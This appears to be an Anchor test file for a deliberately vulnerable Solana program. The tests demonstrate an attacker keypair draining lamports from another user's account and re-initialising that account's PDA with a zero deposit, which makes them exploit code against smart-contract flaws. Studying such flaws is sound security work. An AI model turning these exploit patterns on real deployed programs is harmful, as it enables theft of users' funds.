import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { ReintializationAttack } from "../target/types/reintialization_attack";
import { SYSTEM_PROGRAM_ID } from "@coral-xyz/anchor/dist/cjs/native/system";

async function airDropSol(
  amount: number,
  provider: anchor.AnchorProvider,
  to: anchor.web3.PublicKey
) {
  try {
    const tx = await provider.connection.requestAirdrop(
      to,
      amount * anchor.web3.LAMPORTS_PER_SOL
    );

    await provider.connection.confirmTransaction(tx, "confirmed");
  } catch (error) {
    console.log(`You got an error while airdropping sol  🦀`);
  }
}

describe("reintialization_attack", () => {
  // Configure the client to use the local cluster.
  let provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const program = anchor.workspace
    .reintializationAttack as Program<ReintializationAttack>;

  let user_pda: anchor.web3.PublicKey;
  let amount: number;
  let attacker: anchor.web3.Keypair;

  it("Is initialized!", async () => {
    try {
      // Add your test here.
      [user_pda] = anchor.web3.PublicKey.findProgramAddressSync(
        [Buffer.from("user"), provider.wallet.payer.publicKey.toBytes()],
        program.programId
      );
      amount = 10;

      let tx = await program.methods
        .depositUserAmount(new anchor.BN(amount))
        .accountsStrict({
          user: provider.wallet.payer.publicKey,
          userAccount: user_pda,
          systemProgram: SYSTEM_PROGRAM_ID,
        })
        .signers([provider.wallet.payer])
        .rpc();

      console.log(`Everythinhg went well ${tx}`);
    } catch (error) {
      console.log(`You got an error onciha ⚠️  :`, error);
    }
  });

  it("Attacker will drain the Lamports ", async () => {
    attacker = anchor.web3.Keypair.generate();
    await airDropSol(10, provider, attacker.publicKey);
    try {
      let tx = await program.methods
        .withdrawAmount()
        .accountsStrict({
          user: attacker.publicKey,
          userAccount: user_pda,
          systemProgram: SYSTEM_PROGRAM_ID,
        })
        .signers([attacker])
        .rpc({ skipPreflight: true });

      console.log(`Attacker successfully drained the Lamports ${tx}`);
    } catch (error) {
      console.error(
        `Attacker not successfully drained the Lamports ⚠️  :`,
        error
      );
    }
  });

  it("ReintializationAttack 😈", async () => {
    try {
      amount = 0;

      let tx = await program.methods
        .depositUserAmount(new anchor.BN(amount))
        .accountsStrict({
          user: provider.wallet.payer.publicKey,
          userAccount: user_pda,
          systemProgram: SYSTEM_PROGRAM_ID,
        })
        .signers([provider.wallet.payer])
        .rpc({ skipPreflight: true });

      console.log(
        `Everythinhg went well attacker successfully reintialized the user_pda: ${tx}`
      );
    } catch (error) {
      console.log(`Attacker failed in reintializing the user_pda`, error);
    }
  });
});
